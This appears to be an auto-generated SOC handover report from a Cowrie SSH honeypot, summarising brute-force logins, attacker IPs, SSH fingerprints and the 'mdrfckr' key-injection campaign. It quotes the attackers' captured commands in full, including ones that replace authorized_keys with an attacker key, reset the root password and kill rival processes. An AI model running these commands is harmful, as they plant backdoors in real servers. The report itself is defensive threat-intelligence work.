# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-24 |
| **Generated At** | 2026-05-24T13:43:32Z |
| **Shift Time** | 13:43 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **75** |
| Confirmed Threats | **52** |
| False Positives Filtered | **23** (30.7%) |
| Unique Attacker IPs | **22** |
| Countries of Origin | **12** |
| High Severity Cases | **8** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **67** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **12** |
| Unique Credential Pairs | **8** |
| Unique Usernames | **3** |
| Unique Passwords | **8** |
| Successful Auth Pairs | **8** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 8 |
| `345gs5662d34` | 3 |
| `ubuntu` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 3 |
| `345gs5662d34` | 3 |
| `P@$$w0rd2025` | 1 |
| `123123123123` | 1 |
| `Qazxsw123!` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 3 |
| `345gs5662d34` | `345gs5662d34` | 3 |
| `root` | `P@$$w0rd2025` | 1 |
| `root` | `123123123123` | 1 |
| `root` | `Qazxsw123!` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `P@$$w0rd2025` | `122.177.242.16` | 2026-05-24T11:49:08 |
| `root` | `3245gs5662d34` | `122.177.242.16` | 2026-05-24T11:49:16 |
| `root` | `123123123123` | `103.84.236.222` | 2026-05-24T11:56:54 |
| `root` | `3245gs5662d34` | `103.84.236.222` | 2026-05-24T11:56:56 |
| `root` | `Qazxsw123!` | `142.171.230.122` | 2026-05-24T12:31:53 |
| `root` | `3245gs5662d34` | `142.171.230.122` | 2026-05-24T12:31:59 |
| `root` | `root@123.` | `61.155.106.101` | 2026-05-24T12:38:14 |
| `root` | `prueba` | `59.36.75.227` | 2026-05-24T13:40:11 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **75** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 19 |
| Go SSH scanner | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 11 | 3 |
| `f555226df196...` | Mirai/variant | 7 | 3 |
| `9052c4ab4164...` | Mirai/variant | 1 | 1 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 11 | 3 | Modern SSH client |
| `f555226df196...` | libssh | 7 | 3 | Mirai/variant |
| `95420f9d932d...` | libssh | 1 | 1 | — |
| `9052c4ab4164...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:rQwA2H5kJbCi"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `59.36.75.227`, `61.155.106.101`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.84.236.222`, `122.177.242.16`, `142.171.230.122`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **22** |
| Unique ASNs | **20** |
| High-Risk ASNs | **13** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS16509` | Amazon.com, Inc. | 3 | MEDIUM |
| `AS8075` | Microsoft Corporation | 1 | LOW |
| `AS52361` | ARSAT - Empresa Argentina de Soluciones Satelitales S.A. | 1 | HIGH |
| `AS62068` | SpectraIP B.V. | 1 | HIGH |
| `AS269715` | INFINITYGO TELECOM LTDA | 1 | HIGH |
| `AS4134` | CHINANET BACKBONE | 1 | HIGH |
| `AS28451` | ASESPRI ETHERNET | 1 | LOW |
| `AS50926` | AXARNET COMUNICACIONES, S.L. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (8)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-a6c1db2d5c34

| Field | Detail |
|---|---|
| **Source IP** | `122.177.242[.]16` |
| **First Seen** | 2026-05-24 11:49 |
| **Last Seen** | 2026-05-24 11:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 11:49:07` | `cowrie.session.connect` |
| `2026-05-24 11:49:07` | `cowrie.client.version` |
| `2026-05-24 11:49:07` | `cowrie.client.kex` |
| `2026-05-24 11:49:08` | `cowrie.login.success` |
| `2026-05-24 11:49:08` | `cowrie.session.params` |
| `2026-05-24 11:49:08` | `cowrie.command.input` |
| `2026-05-24 11:49:08` | `cowrie.command.failed` |
| `2026-05-24 11:49:08` | `cowrie.log.closed` |
| `2026-05-24 11:49:08` | `cowrie.session.params` |
| `2026-05-24 11:49:08` | `cowrie.command.input` |
| `2026-05-24 11:49:08` | `cowrie.session.file_download` |
| `2026-05-24 11:49:08` | `cowrie.log.closed` |
| `2026-05-24 11:49:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.177.242[.]16` to AbuseIPDB if not already reported
- [ ] Block `122.177.242[.]16` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12c456f4d9ed

| Field | Detail |
|---|---|
| **Source IP** | `122.177.242[.]16` |
| **First Seen** | 2026-05-24 11:49 |
| **Last Seen** | 2026-05-24 11:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 11:49:16` | `cowrie.session.connect` |
| `2026-05-24 11:49:16` | `cowrie.client.version` |
| `2026-05-24 11:49:16` | `cowrie.client.kex` |
| `2026-05-24 11:49:16` | `cowrie.login.success` |
| `2026-05-24 11:49:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.177.242[.]16` to AbuseIPDB if not already reported
- [ ] Block `122.177.242[.]16` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82171fbec653

| Field | Detail |
|---|---|
| **Source IP** | `103.84.236[.]222` |
| **First Seen** | 2026-05-24 11:56 |
| **Last Seen** | 2026-05-24 11:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 11:56:53` | `cowrie.session.connect` |
| `2026-05-24 11:56:53` | `cowrie.client.version` |
| `2026-05-24 11:56:53` | `cowrie.client.kex` |
| `2026-05-24 11:56:54` | `cowrie.login.success` |
| `2026-05-24 11:56:54` | `cowrie.session.params` |
| `2026-05-24 11:56:54` | `cowrie.command.input` |
| `2026-05-24 11:56:54` | `cowrie.command.failed` |
| `2026-05-24 11:56:54` | `cowrie.log.closed` |
| `2026-05-24 11:56:54` | `cowrie.session.params` |
| `2026-05-24 11:56:54` | `cowrie.command.input` |
| `2026-05-24 11:56:54` | `cowrie.session.file_download` |
| `2026-05-24 11:56:54` | `cowrie.log.closed` |
| `2026-05-24 11:56:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.84.236[.]222` to AbuseIPDB if not already reported
- [ ] Block `103.84.236[.]222` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4100b694edc

| Field | Detail |
|---|---|
| **Source IP** | `103.84.236[.]222` |
| **First Seen** | 2026-05-24 11:56 |
| **Last Seen** | 2026-05-24 11:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 11:56:55` | `cowrie.session.connect` |
| `2026-05-24 11:56:55` | `cowrie.client.version` |
| `2026-05-24 11:56:55` | `cowrie.client.kex` |
| `2026-05-24 11:56:56` | `cowrie.login.success` |
| `2026-05-24 11:56:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.84.236[.]222` to AbuseIPDB if not already reported
- [ ] Block `103.84.236[.]222` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1afe5df8add

| Field | Detail |
|---|---|
| **Source IP** | `142.171.230[.]122` |
| **First Seen** | 2026-05-24 12:31 |
| **Last Seen** | 2026-05-24 12:31 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 12:31:51` | `cowrie.session.connect` |
| `2026-05-24 12:31:51` | `cowrie.client.version` |
| `2026-05-24 12:31:52` | `cowrie.client.kex` |
| `2026-05-24 12:31:53` | `cowrie.login.success` |
| `2026-05-24 12:31:53` | `cowrie.session.params` |
| `2026-05-24 12:31:53` | `cowrie.command.input` |
| `2026-05-24 12:31:53` | `cowrie.command.failed` |
| `2026-05-24 12:31:54` | `cowrie.log.closed` |
| `2026-05-24 12:31:54` | `cowrie.session.params` |
| `2026-05-24 12:31:54` | `cowrie.command.input` |
| `2026-05-24 12:31:54` | `cowrie.session.file_download` |
| `2026-05-24 12:31:54` | `cowrie.log.closed` |
| `2026-05-24 12:31:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `142.171.230[.]122` to AbuseIPDB if not already reported
- [ ] Block `142.171.230[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f93a750dfae8

| Field | Detail |
|---|---|
| **Source IP** | `142.171.230[.]122` |
| **First Seen** | 2026-05-24 12:31 |
| **Last Seen** | 2026-05-24 12:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 12:31:57` | `cowrie.session.connect` |
| `2026-05-24 12:31:57` | `cowrie.client.version` |
| `2026-05-24 12:31:58` | `cowrie.client.kex` |
| `2026-05-24 12:31:59` | `cowrie.login.success` |
| `2026-05-24 12:31:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `142.171.230[.]122` to AbuseIPDB if not already reported
- [ ] Block `142.171.230[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9991ef01993a

| Field | Detail |
|---|---|
| **Source IP** | `61.155.106[.]101` |
| **First Seen** | 2026-05-24 12:38 |
| **Last Seen** | 2026-05-24 12:38 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:rQwA2H5kJbCi"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 12:38:13` | `cowrie.session.connect` |
| `2026-05-24 12:38:13` | `cowrie.client.version` |
| `2026-05-24 12:38:13` | `cowrie.client.kex` |
| `2026-05-24 12:38:14` | `cowrie.login.success` |
| `2026-05-24 12:38:14` | `cowrie.session.params` |
| `2026-05-24 12:38:14` | `cowrie.command.input` |
| `2026-05-24 12:38:14` | `cowrie.command.failed` |
| `2026-05-24 12:38:14` | `cowrie.log.closed` |
| `2026-05-24 12:38:15` | `cowrie.session.params` |
| `2026-05-24 12:38:15` | `cowrie.command.input` |
| `2026-05-24 12:38:15` | `cowrie.session.file_download` |
| `2026-05-24 12:38:15` | `cowrie.log.closed` |
| `2026-05-24 12:38:29` | `cowrie.session.params` |
| `2026-05-24 12:38:29` | `cowrie.command.input` |
| `2026-05-24 12:38:30` | `cowrie.log.closed` |
| `2026-05-24 12:38:30` | `cowrie.session.params` |
| `2026-05-24 12:38:30` | `cowrie.command.input` |
| `2026-05-24 12:38:30` | `cowrie.log.closed` |
| `2026-05-24 12:38:31` | `cowrie.session.params` |
| `2026-05-24 12:38:31` | `cowrie.command.input` |
| `2026-05-24 12:38:31` | `cowrie.session.file_download` |
| `2026-05-24 12:38:31` | `cowrie.log.closed` |
| `2026-05-24 12:38:31` | `cowrie.session.params` |
| `2026-05-24 12:38:31` | `cowrie.command.input` |
| `2026-05-24 12:38:31` | `cowrie.log.closed` |
| `2026-05-24 12:38:32` | `cowrie.session.params` |
| `2026-05-24 12:38:32` | `cowrie.command.input` |
| `2026-05-24 12:38:32` | `cowrie.log.closed` |
| `2026-05-24 12:38:32` | `cowrie.session.params` |
| `2026-05-24 12:38:32` | `cowrie.command.input` |
| `2026-05-24 12:38:32` | `cowrie.command.input` |
| `2026-05-24 12:38:32` | `cowrie.log.closed` |
| `2026-05-24 12:38:33` | `cowrie.session.params` |
| `2026-05-24 12:38:33` | `cowrie.command.input` |
| `2026-05-24 12:38:33` | `cowrie.log.closed` |
| `2026-05-24 12:38:33` | `cowrie.session.params` |
| `2026-05-24 12:38:33` | `cowrie.command.input` |
| `2026-05-24 12:38:33` | `cowrie.log.closed` |
| `2026-05-24 12:38:34` | `cowrie.session.params` |
| `2026-05-24 12:38:34` | `cowrie.command.input` |
| `2026-05-24 12:38:34` | `cowrie.log.closed` |
| `2026-05-24 12:38:34` | `cowrie.session.params` |
| `2026-05-24 12:38:34` | `cowrie.command.input` |
| `2026-05-24 12:38:34` | `cowrie.log.closed` |
| `2026-05-24 12:38:35` | `cowrie.session.params` |
| `2026-05-24 12:38:35` | `cowrie.command.input` |
| `2026-05-24 12:38:35` | `cowrie.log.closed` |
| `2026-05-24 12:38:35` | `cowrie.session.params` |
| `2026-05-24 12:38:35` | `cowrie.command.input` |
| `2026-05-24 12:38:35` | `cowrie.log.closed` |
| `2026-05-24 12:38:36` | `cowrie.session.params` |
| `2026-05-24 12:38:36` | `cowrie.command.input` |
| `2026-05-24 12:38:36` | `cowrie.log.closed` |
| `2026-05-24 12:38:36` | `cowrie.session.params` |
| `2026-05-24 12:38:36` | `cowrie.command.input` |
| `2026-05-24 12:38:36` | `cowrie.log.closed` |
| `2026-05-24 12:38:37` | `cowrie.session.params` |
| `2026-05-24 12:38:37` | `cowrie.command.input` |
| `2026-05-24 12:38:37` | `cowrie.log.closed` |
| `2026-05-24 12:38:37` | `cowrie.session.params` |
| `2026-05-24 12:38:37` | `cowrie.command.input` |
| `2026-05-24 12:38:37` | `cowrie.log.closed` |
| `2026-05-24 12:38:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.155.106[.]101` to AbuseIPDB if not already reported
- [ ] Block `61.155.106[.]101` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f41fd7ee9825

| Field | Detail |
|---|---|
| **Source IP** | `59.36.75[.]227` |
| **First Seen** | 2026-05-24 13:40 |
| **Last Seen** | 2026-05-24 13:40 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:jlWfUTxrKtxk"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 13:40:10` | `cowrie.session.connect` |
| `2026-05-24 13:40:11` | `cowrie.client.version` |
| `2026-05-24 13:40:11` | `cowrie.client.kex` |
| `2026-05-24 13:40:11` | `cowrie.login.success` |
| `2026-05-24 13:40:11` | `cowrie.session.params` |
| `2026-05-24 13:40:11` | `cowrie.command.input` |
| `2026-05-24 13:40:11` | `cowrie.command.failed` |
| `2026-05-24 13:40:11` | `cowrie.log.closed` |
| `2026-05-24 13:40:12` | `cowrie.session.params` |
| `2026-05-24 13:40:12` | `cowrie.command.input` |
| `2026-05-24 13:40:12` | `cowrie.session.file_download` |
| `2026-05-24 13:40:12` | `cowrie.log.closed` |
| `2026-05-24 13:40:22` | `cowrie.session.params` |
| `2026-05-24 13:40:22` | `cowrie.command.input` |
| `2026-05-24 13:40:22` | `cowrie.log.closed` |
| `2026-05-24 13:40:23` | `cowrie.session.params` |
| `2026-05-24 13:40:23` | `cowrie.command.input` |
| `2026-05-24 13:40:23` | `cowrie.log.closed` |
| `2026-05-24 13:40:23` | `cowrie.session.params` |
| `2026-05-24 13:40:23` | `cowrie.command.input` |
| `2026-05-24 13:40:23` | `cowrie.session.file_download` |
| `2026-05-24 13:40:23` | `cowrie.log.closed` |
| `2026-05-24 13:40:24` | `cowrie.session.params` |
| `2026-05-24 13:40:24` | `cowrie.command.input` |
| `2026-05-24 13:40:24` | `cowrie.log.closed` |
| `2026-05-24 13:40:24` | `cowrie.session.params` |
| `2026-05-24 13:40:24` | `cowrie.command.input` |
| `2026-05-24 13:40:25` | `cowrie.log.closed` |
| `2026-05-24 13:40:25` | `cowrie.session.params` |
| `2026-05-24 13:40:25` | `cowrie.command.input` |
| `2026-05-24 13:40:25` | `cowrie.command.input` |
| `2026-05-24 13:40:25` | `cowrie.log.closed` |
| `2026-05-24 13:40:25` | `cowrie.session.params` |
| `2026-05-24 13:40:25` | `cowrie.command.input` |
| `2026-05-24 13:40:25` | `cowrie.log.closed` |
| `2026-05-24 13:40:26` | `cowrie.session.params` |
| `2026-05-24 13:40:26` | `cowrie.command.input` |
| `2026-05-24 13:40:26` | `cowrie.log.closed` |
| `2026-05-24 13:40:26` | `cowrie.session.params` |
| `2026-05-24 13:40:26` | `cowrie.command.input` |
| `2026-05-24 13:40:26` | `cowrie.log.closed` |
| `2026-05-24 13:40:26` | `cowrie.session.params` |
| `2026-05-24 13:40:26` | `cowrie.command.input` |
| `2026-05-24 13:40:27` | `cowrie.log.closed` |
| `2026-05-24 13:40:27` | `cowrie.session.params` |
| `2026-05-24 13:40:27` | `cowrie.command.input` |
| `2026-05-24 13:40:27` | `cowrie.log.closed` |
| `2026-05-24 13:40:27` | `cowrie.session.params` |
| `2026-05-24 13:40:27` | `cowrie.command.input` |
| `2026-05-24 13:40:27` | `cowrie.log.closed` |
| `2026-05-24 13:40:28` | `cowrie.session.params` |
| `2026-05-24 13:40:28` | `cowrie.command.input` |
| `2026-05-24 13:40:28` | `cowrie.log.closed` |
| `2026-05-24 13:40:28` | `cowrie.session.params` |
| `2026-05-24 13:40:28` | `cowrie.command.input` |
| `2026-05-24 13:40:28` | `cowrie.log.closed` |
| `2026-05-24 13:40:28` | `cowrie.session.params` |
| `2026-05-24 13:40:28` | `cowrie.command.input` |
| `2026-05-24 13:40:29` | `cowrie.log.closed` |
| `2026-05-24 13:40:29` | `cowrie.session.params` |
| `2026-05-24 13:40:29` | `cowrie.command.input` |
| `2026-05-24 13:40:29` | `cowrie.log.closed` |
| `2026-05-24 13:40:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.36.75[.]227` to AbuseIPDB if not already reported
- [ ] Block `59.36.75[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

